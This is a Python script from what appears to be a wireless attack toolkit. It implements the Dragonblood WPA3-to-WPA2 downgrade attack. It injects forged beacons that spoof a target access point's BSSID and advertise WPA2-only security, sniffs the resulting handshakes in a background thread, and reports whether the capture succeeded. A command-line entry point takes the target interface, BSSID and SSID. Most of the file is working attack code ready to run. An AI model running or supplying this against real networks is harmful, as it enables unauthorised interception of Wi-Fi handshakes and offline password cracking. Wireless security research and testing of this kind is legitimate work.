from __future__ import annotations

import argparse
import logging
import threading
import time

from attacks.common.base_attack import BaseAttack
from attacks.common.cli import add_common_arguments, create_backend, run_attack
from attacks.common.config import AttackConfig, DowngradeAttackConfig
from attacks.common.io.reporting import (
    create_run_directory,
    save_analysis_report,
    save_metadata,
)
from attacks.common.models import AnalysisReport, CaptureRawResults
from attacks.common.wireless.rsn import build_wpa2_only_rsn

logger = logging.getLogger(__name__)


class DowngradeAttack(BaseAttack):
    def execute(self, config: AttackConfig) -> CaptureRawResults:
        if not isinstance(config, DowngradeAttackConfig):
            raise TypeError("DowngradeAttack requires DowngradeAttackConfig")

        wpa2_only_rsn = build_wpa2_only_rsn()
        captured_handshakes = []
        sniffing_complete = threading.Event()

        def sniff_in_background():
            frames = self.backend.sniff_handshakes(
                interface=self.interface,
                target_bssid=self.target_bssid,
                timeout=config.monitor_duration_seconds,
            )
            captured_handshakes.extend(frames)
            sniffing_complete.set()

        sniffer_thread = threading.Thread(target=sniff_in_background, daemon=True)
        sniffer_thread.start()

        logger.info(
            "Injecting forged WPA2-only beacons for %.1fs at %.0fms intervals",
            config.monitor_duration_seconds,
            config.beacon_injection_rate_ms,
        )

        deadline = time.monotonic() + config.monitor_duration_seconds
        beacon_count = 0
        while time.monotonic() < deadline:
            self.backend.inject_beacon(
                interface=self.interface,
                source_bssid=self.target_bssid,
                ssid=config.target_ssid,
                channel=config.channel,
                rsn_info=wpa2_only_rsn,
            )
            beacon_count += 1
            time.sleep(config.beacon_injection_rate_ms / 1000)

        logger.info("Injected %d forged beacons", beacon_count)

        sniffing_complete.wait(timeout=5.0)
        sniffer_thread.join(timeout=5.0)

        logger.info("Captured %d handshake frames", len(captured_handshakes))

        return CaptureRawResults(
            attack_name="dragonblood-downgrade",
            captures=captured_handshakes,
            metadata={
                "beacon_count": beacon_count,
                "duration_seconds": config.monitor_duration_seconds,
            },
        )

    def analyze(self, raw_results: CaptureRawResults) -> AnalysisReport:
        run_directory = create_run_directory(self.output_dir, "dragonblood-downgrade")

        downgrade_detected = len(raw_results.captures) > 0

        if downgrade_detected:
            summary = (
                f"Downgrade successful: captured {len(raw_results.captures)} "
                f"WPA2 handshake frames after beacon injection"
            )
        else:
            summary = "Downgrade not detected: no WPA2 handshake frames captured"

        save_metadata(
            run_directory / "metadata.json",
            attack_name="dragonblood-downgrade",
            config_dict=raw_results.metadata,
        )

        report = AnalysisReport(
            attack_name="dragonblood-downgrade",
            success=downgrade_detected,
            summary=summary,
            raw_csv_path=run_directory / "captures.log",
            metadata={
                "captured_frame_count": len(raw_results.captures),
                "beacon_count": raw_results.metadata.get("beacon_count", 0),
            },
        )

        save_analysis_report(report, run_directory / "analysis.json")

        return report


def main():
    parser = argparse.ArgumentParser(description="Dragonblood WPA3→WPA2 downgrade attack")
    add_common_arguments(parser)
    parser.add_argument("--duration", type=float, default=30.0, help="Attack duration in seconds")
    arguments = parser.parse_args()

    backend = create_backend(arguments)
    attack = DowngradeAttack(
        interface=arguments.interface,
        target_bssid=arguments.bssid,
        target_ssid=arguments.ssid,
        output_dir=arguments.output_dir,
        backend=backend,
    )

    config = DowngradeAttackConfig(
        target_bssid=arguments.bssid,
        target_ssid=arguments.ssid,
        channel=arguments.channel,
        monitor_duration_seconds=arguments.duration,
    )

    run_attack("dragonblood-downgrade", attack, config)


if __name__ == "__main__":
    main()
